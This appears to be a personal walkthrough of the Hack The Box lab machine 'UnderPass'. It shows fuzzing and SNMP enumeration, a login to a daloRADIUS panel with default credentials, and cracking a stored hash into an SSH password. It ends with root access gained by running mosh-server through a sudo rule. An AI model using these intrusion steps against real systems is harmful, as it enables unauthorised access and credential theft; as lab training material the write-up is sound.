First I try ennumerate directories with 
```
ffuf -u http://10.10.11.48/FUZZ -w /home/pachhh/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404 -s >> dir.txt
```
that returns "server-status" but nothing interest

Now I will try ennumerate subdomains
```
ffuf -w /home/pachhh/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.10.10.11.48/ -fw 0
-v -s >> sub.txt
```

I use UDP protocol and found:
```
PORT     STATE  SERVICE
53/udp   closed domain
67/udp   closed dhcps
68/udp   closed dhcpc
69/udp   closed tftp
123/udp  closed ntp
137/udp  closed netbios-ns
138/udp  closed netbios-dgm
161/udp  open   snmp
162/udp  closed snmptrap
500/udp  closed isakmp
5060/udp closed sip
5061/udp closed sip-tls
5353/udp closed zeroconf
```

with [[SNMPWALK]] i get:
```
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
```

fuzzing with FEROXBUSTER 
```
feroxbuster -w /home/pachhh/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://underpass.htb/daloradius/
```
and found: 
http://underpass.htb/daloradius/app/users/login.php

here another route: 
http://underpass.htb/daloradius/app/operators/login.php

I use Burpsuite for SQLinjection but i dont found nothing interesting

I tried log with default credentials in this route: http://underpass.htb/daloradius/app/operators/login.php and i was success

in the http://underpass.htb/daloradius/app/operators/home-main.php i found this dashboard

![1](HackTheBox/UnderPass/IMGS/Pasted%20image%2020250121121844.png)

inside, in the users section obtain:

User: svcMosh
Password: 412DD4759978ACFCC81DEAB01B382403

Making more investigation i get this link http://underpass.htb/daloradius/app/operators/config-db.php with: 

![2](HackTheBox/UnderPass/IMGS/Pasted%20image%2020250121122429.png)

I cracked the hash (412DD4759978ACFCC81DEAB01B382403) in CrackStation and i get: underwaterfriends 

I connect for SSH in svcMosh@underpass.htb with that password.

in Desktop obtain userflag

Now I try get the root flag, for this I need what command I can execute:

```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on
    localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty                              
User svcMosh may run the following
        commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

```

I can execute [[MOSH]] server , so later of trying some commands, this works for me:

```
mosh --server="sudo /usr/bin/mosh-server" localhost
```

inside we found the root.txt
